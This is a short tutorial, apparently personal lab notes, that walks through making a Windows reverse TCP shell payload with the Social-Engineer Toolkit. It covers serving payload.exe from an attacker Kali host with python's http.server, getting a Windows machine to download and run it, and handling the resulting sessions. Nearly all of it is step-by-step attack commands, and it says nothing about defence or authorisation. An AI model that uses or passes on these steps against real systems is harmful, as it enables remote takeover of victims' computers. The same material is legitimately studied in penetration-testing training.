## Creating Payload usng Social Enginerring Toolkit

### Step 1 ( open social engineerring toolkit )

```shell

## open app ( social engineering toolkit (root) )

1 # option # Social-Engineering Attacks

4 # option # Create a Payload and Listener

1 # option # windows Shell Reverse TCP

*ip_address_kali # ip address of your computer (kali) # ifconfig # ip addr show # hostname -I

*port_number # type unused port in your computer (kali)

```

### Step 2 ( find my payload )

```shell

# open new terminal and type this

cd /root/.set/

ls

==========
payload.exe
==========

```


### Step 3 ( Creating server )

```shell

python3 -m http.server --bind *ip_address_kali

# 1. copy link 
# 2. past it in windows machine 
# 3. download the payload.exe 

```

### Step 4 ( listening to the windows machine )

```shell

# back to the social engineering toolkit

yes # option # to start the payload listening

# stop this server that you create using python

# go the windows machine and run payload.exe

sessions -l

dir

```

### Step 5 ( problem )

```shell

# if you have problem with session ( not found session ) solution is

## 1. run the file as administrator

## 2. stop this server that you run it using python

## 3. using this command to start the listenning again

exploit -j -z

```

### Step 6 ( removing file and folder )

```shell

rmdir folder_name

rm -rf folder_name

```
